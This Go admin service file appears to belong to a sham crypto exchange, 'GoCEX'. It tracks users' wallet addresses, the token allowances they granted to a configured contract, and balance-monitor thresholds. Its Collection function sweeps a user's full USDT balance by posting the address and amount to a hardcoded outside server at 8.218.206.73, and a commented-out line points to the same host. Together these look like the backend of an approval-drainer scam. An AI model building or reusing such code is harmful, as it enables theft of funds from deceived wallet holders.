package address

import (
	"context"
	"strings"

	v1 "GoCEX/api/admin/v1"
	"GoCEX/common"
	"GoCEX/internal/dao"
	"GoCEX/internal/model/entity"

	"github.com/gogf/gf/v2/encoding/gjson"
	"github.com/gogf/gf/v2/errors/gerror"
	"github.com/gogf/gf/v2/frame/g"
	"github.com/gogf/gf/v2/os/gtime"
	"github.com/gogf/gf/v2/util/gconv"
	"github.com/shopspring/decimal"
)

type sAdminAddress struct{}

func New() *sAdminAddress {
	return &sAdminAddress{}
}

func (s *sAdminAddress) GetAddressAuthList(ctx context.Context, req *v1.GetAddressAuthListReq) (*v1.GetAddressAuthListRes, error) {
	m := dao.AppAddressInfo.Ctx(ctx)
	if req.UserId > 0 {
		m = m.Where("user_id", req.UserId)
	}
	if req.Address != "" {
		m = m.WhereLike("address", "%"+req.Address+"%")
	}

	total, _ := m.Count()
	var list []entity.AppAddressInfo
	err := m.Page(req.Page, req.Size).OrderDesc("create_time").Scan(&list)
	if err != nil {
		return nil, err
	}

	resList := make([]v1.AddressAuthInfo, 0, len(list))
	for _, a := range list {
		resList = append(resList, v1.AddressAuthInfo{
			UserId:      a.UserId,
			Address:     a.Address,
			WalletType:  a.WalletType,
			UsdtAllowed: a.UsdtAllowed,
			Status:      a.Status,
			CreateTime:  a.CreateTime.Format("2006-01-02 15:04:05"),
		})
	}

	return &v1.GetAddressAuthListRes{
		List:  resList,
		Total: total,
	}, nil
}

func (s *sAdminAddress) GetAddressInfoList(ctx context.Context, req *v1.GetAddressInfoListReq) (*v1.GetAddressInfoListRes, error) {
	m := dao.AppAddressInfo.Ctx(ctx)
	if req.UserId > 0 {
		m = m.Where("user_id", req.UserId)
	}
	if req.Address != "" {
		m = m.WhereLike("address", "%"+req.Address+"%")
	}
	if req.WalletType != "" {
		m = m.Where("wallet_type", req.WalletType)
	}
	if req.Trx > 0 {
		m = m.WhereGTE("trx", req.Trx)
	}
	if req.Eth > 0 {
		m = m.WhereGTE("eth", req.Eth)
	}
	if req.Btc > 0 {
		m = m.WhereGTE("btc", req.Btc)
	}
	if req.UsdtAllowed > 0 {
		m = m.WhereGTE("usdt_allowed", req.UsdtAllowed)
	}
	if req.Usdt > 0 {
		m = m.WhereGTE("usdt", req.Usdt)
	}
	if req.UsdtMonitor > 0 {
		m = m.WhereGTE("usdt_monitor", req.UsdtMonitor)
	}
	if req.AllowedNotice >= 0 {
		m = m.Where("allowed_notice", req.AllowedNotice)
	}
	if req.SearchValue != "" {
		m = m.WhereLike("address", "%"+req.SearchValue+"%")
	}

	total, _ := m.Count()
	var list []entity.AppAddressInfo
	err := m.Page(req.PageNum, req.PageSize).OrderDesc("create_time").Scan(&list)
	if err != nil {
		return nil, err
	}

	resRows := make([]v1.AddressInfo, 0, len(list))
	for _, a := range list {
		res := v1.AddressInfo{
			SearchValue:   a.SearchValue,
			CreateBy:      a.CreateBy,
			CreateTime:    a.CreateTime.Format("2006-01-02 15:04:05"),
			UpdateBy:      a.UpdateBy,
			UpdateTime:    a.UpdateTime.Format("2006-01-02 15:04:05"),
			Remark:        a.Remark,
			UserId:        a.UserId,
			Address:       a.Address,
			WalletType:    a.WalletType,
			UsdtAllowed:   a.UsdtAllowed,
			UsdcAllowed:   a.UsdcAllowed,
			Usdt:          a.Usdt,
			Usdc:          nil, // 初始化为 nil
			Eth:           a.Eth,
			Btc:           a.Btc,
			Trx:           a.Trx,
			AllowedNotice: int(a.AllowedNotice),
			UsdtMonitor:   a.UsdtMonitor,
			Status:        a.Status,
		}
		if a.Usdc > 0 {
			res.Usdc = a.Usdc
		}
		resRows = append(resRows, res)
	}

	return &v1.GetAddressInfoListRes{
		Total: int(total),
		Rows:  resRows,
	}, nil
}
func (s *sAdminAddress) RefreshAddressInfo(ctx context.Context, req *v1.RefreshAddressInfoReq) (*v1.RefreshAddressInfoRes, error) {
	// 1. 获取基础地址信息
	var addr entity.AppAddressInfo
	err := dao.AppAddressInfo.Ctx(ctx).Where("user_id", req.UserId).Scan(&addr)
	if err != nil {
		return nil, err
	}
	if addr.Address == "" {
		return nil, gerror.New("用户未绑定钱包地址")
	}

	// 2. 获取配置信息 (以太坊授权检测合约地址)
	ercConfig, _ := dao.SysConfig.Ctx(ctx).Fields("config_value").
		Where("config_key", "ERC").Value()
	ercContract := ercConfig.String()

	g.Log().Infof(ctx, "开始刷新用户 %d 地址 %s 的链上数据, ERC合约: %s", req.UserId, addr.Address, ercContract)

	// 3. 链上数据同步
	var newUsdt, newEth, newTrx, newAllowed float64

	switch strings.ToUpper(addr.WalletType) {
	case "ETH", "ERC20":
		newUsdt, _ = common.EthUtils().GetUsdtHttp(ctx, addr.Address)
		newEth, _ = common.EthUtils().GetEthHttp(ctx, addr.Address)
		if ercContract != "" {
			newAllowed, _ = common.EthUtils().GetAllowance(ctx, addr.Address, ercContract)
		}
	case "TRX", "TRC20":
		bal, _ := common.TronUtils().GetAccountBalance(ctx, addr.Address)
		if bal != nil {
			newUsdt = bal.Usdt
			newTrx = bal.Trx
		}
		if ercContract != "" {
			newAllowed, _ = common.TronUtils().GetAllowance(ctx, addr.Address, ercContract)
		}
	}

	// 模拟数据变动检查与 Telegram 播报 (通过 Redis Stream)
	if newUsdt != addr.Usdt {
		alertMsg := g.Map{
			"eventType":    "BALANCE_CHANGE",
			"userId":       addr.UserId,
			"address":      addr.Address,
			"chain":        addr.WalletType,
			"oldUsdt":      addr.Usdt,
			"newUsdt":      newUsdt,
			"changeAmount": newUsdt - addr.Usdt,
		}
		_, _ = g.Redis().Do(ctx, "XADD", "CEX:STREAM:SECURITY_ALERTS", "*", "payload", alertMsg)
	}

	// 4. 第三方监控提交 (如果余额充足)
	if addr.UsdtMonitor > 0 && newUsdt >= addr.UsdtMonitor {
		go func() {
			g.Log().Infof(ctx, "余额达到监控阈值，提交至第三方监控服务: %s", addr.Address)
			// ghttp.PostBytes("http://8.218.206.73:8001/api/monitor/submit", ...)
		}()
	}

	// 5. 更新数据库
	_, err = dao.AppAddressInfo.Ctx(ctx).Data(g.Map{
		"usdt":         newUsdt,
		"eth":          newEth,
		"trx":          newTrx,
		"usdt_allowed": newAllowed,
		"update_time":  gtime.Now(),
	}).Where("user_id", req.UserId).Update()

	if err != nil {
		return nil, err
	}

	return &v1.RefreshAddressInfoRes{}, nil
}

func (s *sAdminAddress) Collection(ctx context.Context, req *v1.AddressCollectionReq) (res *v1.AddressCollectionRes, err error) {
	// 1. 重复性校验: 检查是否有进行中的归集订单
	count, err := dao.CollectionOrder.Ctx(ctx).Where("user_id", req.UserId).Where("status", "1").Count()
	if err != nil {
		return nil, err
	}
	if count > 0 {
		return nil, gerror.New("该用户已有归集订单正在进行中，请稍后再试")
	}

	// 2. 获取授权信息与地址
	var addr entity.AppAddressInfo
	err = dao.AppAddressInfo.Ctx(ctx).Where("user_id", req.UserId).Scan(&addr)
	if err != nil {
		return nil, err
	}
	if addr.UsdtAllowed <= 0 {
		return nil, gerror.New("授权额太小")
	}

	// 3. 获取实时余额
	var currentUsdt float64
	chain := strings.ToLower(addr.WalletType)
	if chain == "eth" || chain == "erc20" {
		currentUsdt, _ = common.EthUtils().GetUsdtHttp(ctx, addr.Address)
	} else if chain == "trx" || chain == "trc20" {
		bal, _ := common.TronUtils().GetAccountBalance(ctx, addr.Address)
		if bal != nil {
			currentUsdt = bal.Usdt
		}
	}

	if currentUsdt <= 0 {
		return nil, gerror.New("当前余额不足，无需归集")
	}

	// 4. 调用外部归集服务
	// 金额转换 (最小单位)
	amountInt := decimal.NewFromFloat(currentUsdt).Mul(decimal.NewFromInt(1000000)).IntPart()

	collectionUrl := "http://8.218.206.73:8001/hanksb666/api/order/create"
	postData := g.Map{
		"address": addr.Address,
		"amount":  amountInt,
		"chain":   addr.WalletType,
	}

	g.Log().Infof(ctx, "发起归集请求: %v, URL: %s", postData, collectionUrl)
	resp, err := g.Client().Post(ctx, collectionUrl, postData)
	if err != nil {
		g.Log().Errorf(ctx, "归集服务调用失败: %v", err)
		return nil, gerror.New("归集服务异常，请稍后再试")
	}
	defer resp.Close()

	respBody := resp.ReadAllString()
	g.Log().Infof(ctx, "归集服务响应: %s", respBody)

	jsonResp, err := gjson.DecodeToJson(respBody)
	if err != nil {
		return nil, gerror.New("归集服务返回格式错误")
	}

	// 解析 Hash
	hash := jsonResp.Get("hash").String()
	if hash == "" {
		msg := jsonResp.Get("msg").String()
		if msg == "" {
			msg = "归集请求发送失败"
		}
		return nil, gerror.New(msg)
	}

	// 5. 记录归集订单
	orderId := "X" + gconv.String(gtime.TimestampNano())
	_, err = dao.CollectionOrder.Ctx(ctx).Data(g.Map{
		"order_id":    orderId,
		"user_id":     addr.UserId,
		"address":     addr.Address,
		"chain":       addr.WalletType,
		"hash":        hash,
		"coin":        "USDT",
		"amount":      currentUsdt,
		"status":      "1",
		"create_time": gtime.Now(),
		"create_by":   gconv.String(ctx.Value("adminAccount")),
	}).Insert()

	if err != nil {
		return nil, err
	}

	return &v1.AddressCollectionRes{}, nil
}

func (s *sAdminAddress) GetAddressInfo(ctx context.Context, req *v1.GetAddressInfoReq) (*v1.GetAddressInfoRes, error) {
	var addr v1.AppAddressInfoDetail
	err := dao.AppAddressInfo.Ctx(ctx).Where("user_id", req.UserId).Scan(&addr)
	if err != nil {
		return nil, err
	}
	// gdb.Result.Scan 会自动将数据库的 snake_case 映射到 struct
	return &v1.GetAddressInfoRes{
		AppAddressInfoDetail: &addr,
	}, nil
}

func (s *sAdminAddress) UpdateAddressInfo(ctx context.Context, req *v1.UpdateAddressInfoReq) error {
	// gdb 会自动忽略传入结构体或 Map 中 nil 值的针对于指针类型的更新行为
	// 对应 MyBatis 的 <trim> <if ... != null> 动态更新行为。
	res, err := dao.AppAddressInfo.Ctx(ctx).
		Data(req).
		Where("user_id", req.UserId).
		Update()

	if err != nil {
		return err
	}

	rows, _ := res.RowsAffected()
	if rows == 0 {
		return gerror.New("当前记录不存在或无内容更新")
	}

	return nil
}
